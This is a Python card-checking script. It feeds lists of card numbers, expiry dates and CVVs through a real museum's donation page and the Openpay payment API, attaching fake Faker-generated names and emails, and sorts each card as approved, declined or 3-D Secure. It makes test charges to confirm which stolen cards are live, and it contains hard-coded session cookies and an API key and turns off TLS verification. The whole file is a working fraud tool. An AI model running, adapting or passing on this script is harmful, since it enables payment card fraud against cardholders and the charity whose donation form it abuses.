import requests, urllib3, sys, random, traceback
from faker import Faker
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

fake = Faker("es_AR")
def device():
    return fake.password(length=32, special_chars=False, digits=True, upper_case=True, lower_case=True)

def mail():
    dominios = ['hotmail.com', 'gmail.com', 'outlook.com', 'yahoo.com']
    nombre_usuario = fake.user_name().replace(" ", "").replace(".", "").replace("-", "").lower()
    dominio = random.choice(dominios)
    correo = f"{nombre_usuario}@{dominio}"
    return correo
    
def names():
    return fake.first_name(), fake.last_name()
def main5(si):
    try:
        card = si.strip()
        num_t, mes, ano, cvv = card.strip().split("|")
        if len(ano) == 4:
        	ano = ano[-2:]
        session = requests.Session()
        name, last = names()
        url = f"https://www.papalote.org.mx/php/donativos/bbva.php?nombre={name}&apellidos={last}&correo={mail()}&donativo=5"
        headers = {
  "Host": "www.papalote.org.mx","Connection": "keep-alive","sec-ch-ua": "\"Chromium\";v=\"136\", \"Brave\";v=\"136\", \"Not.A/Brand\";v=\"99\"","sec-ch-ua-mobile": "?1","sec-ch-ua-platform": "\"Android\"","Upgrade-Insecure-Requests": "1","User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36","Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8","Sec-GPC": "1","Accept-Language": "es-MX,es;q=0.9","Sec-Fetch-Site": "same-origin","Sec-Fetch-Mode": "navigate","Sec-Fetch-User": "?1","Sec-Fetch-Dest": "document", "Referer": "https://www.papalote.org.mx/donativos/",
        }
        
        res = session.get(url, headers=headers, allow_redirects=False, verify=False)
        loc = res.headers.get("Location")
        aapi = loc.split("/")[6]
        
        
        url = "https://api.openpay.mx/v1/mmsifbgsudhexmlkiezu/tokens"
        cookies = {
  "JSESSIONID": "392D3FE2K73EEA76D2D27E0E356629EE",
        }
        
        headers = {
  "Host": "api.openpay.mx","Connection": "keep-alive","X-NewRelic-ID": "UQEHWFZWGwIGVFNTDwMOXlE=","sec-ch-ua-platform": "\"Android\"", "Authorization": "Basic cGtfN2E3YzUzNDY4Njc0NDAwZjg2M2EwNGFhYzM0OWY0NTM6","sec-ch-ua": "\"Chromium\";v=\"136\", \"Brave\";v=\"136\", \"Not.A/Brand\";v=\"99\"","newrelic": "eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjU3MDkwNSIsImFwIjoiMTgzNDg5OTM2NyIsImlkIjoiNTViN2RkYjEzYzM0YzQwOSIsInRyIjoiMTUzNTA0ZmQyZDFjNWQ2MTUzNGEzYWI1NjVhYTEwZGUiLCJ0aSI6MTc1MTg2ODExODIyMX19","sec-ch-ua-mobile": "?1", "traceparent": "00-153504fd2d1c5d61534a3ab565aa10de-55b7ddb13c34c409-01","User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36","Accept": "application/json","Content-Type": "application/json","tracestate": "570905@nr=0-1-570905-1834899367-55b7ddb13c34c409----1751868118221",
        }
        data = f"""{{"expiration_month":"{mes}","expiration_year":"{ano}","holder_name":"{name} {last}","card_number":"{num_t}","cvv2":"{cvv}"}}"""
        res = session.post(url, headers=headers, cookies=cookies, data=data)
        tok = res.json()["id"]
        
        url = "https://api.openpay.mx/v1/card-payment/charge"
        cookies = {
  "JSESSIONID": "392D3FE2673EEA76D2D27E0E356629EE",
        }
        
        headers = {
  "Host": "api.openpay.mx","Connection": "keep-alive", "X-NewRelic-ID": "UQEHWFZWGwIGVFNTDwMOXlE=","sec-ch-ua-platform": "\"Android\"","sec-ch-ua": "\"Chromium\";v=\"136\", \"Brave\";v=\"136\", \"Not.A/Brand\";v=\"99\"", "X-Requested-With": "XMLHttpRequest","User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36", "Accept": "*/*","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","tracestate": "570905@nr=0-1-570905-1834899367-396feff2eab68ad9----1751868118547","Sec-GPC": "1","Accept-Language": "es-MX,es;q=0.5","Origin": "https://api.openpay.mx","Sec-Fetch-Site": "same-origin","Sec-Fetch-Mode": "cors","Sec-Fetch-Dest": "empty","Referer": f"{loc}",
        }
        data = f"""tokenId={tok}&transactionId={aapi}&checkoutId=&deviceSessionId={device()}&browserScreenHeight=360&browserScreenWidth=592&browserUserAgent=Mozilla%2F5.0%20(Linux%3B%20Linux%2010%3B%20K)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F136.0.0.0%20Mobile%20Safari%2F537.36&browserLanguage=es-MX&browserJavaEnabled=false&browserJavaScriptEnabled=true&useCof=false"""
        res = session.post(url, headers=headers, cookies=cookies, data=data)
        if "La tarjeta fue declinada" in res.text:
        	return [card, "Declined", "La tarjeta fue declinada"]
        elif '"status":"completed"' in res.text:
        	return [card, "Approved", "Cargo aprobado.", res.json()]
        elif '"status":"charge_pending"' in res.text:
        	return [card, "Custom", "3D"]
        else:
        	return [card, "Custom", res.json()]
    except:
        tb = sys.exc_info()[2]
        linea = traceback.extract_tb(tb)[-1].lineno
        print(f"Ocurrió un error en la línea {linea}: {e}")